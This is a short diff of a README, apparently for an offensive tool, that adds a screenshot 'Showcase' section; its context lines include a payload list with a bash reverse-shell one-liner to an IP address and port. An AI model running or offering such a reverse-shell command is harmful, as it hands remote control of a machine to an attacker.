@@ -30,6 +30,10 @@ Payload list:
 - bash -i >& /dev/tcp/192.168.0.1/1234 0>&1
 ```
 
+## Showcase
+![Execution](https://cdn.discordapp.com/attachments/805825050929790977/958156647744819210/print.png)
+
+
 ## Compile
 
 Compile it yourself or use pre-compiled binary from releases section.
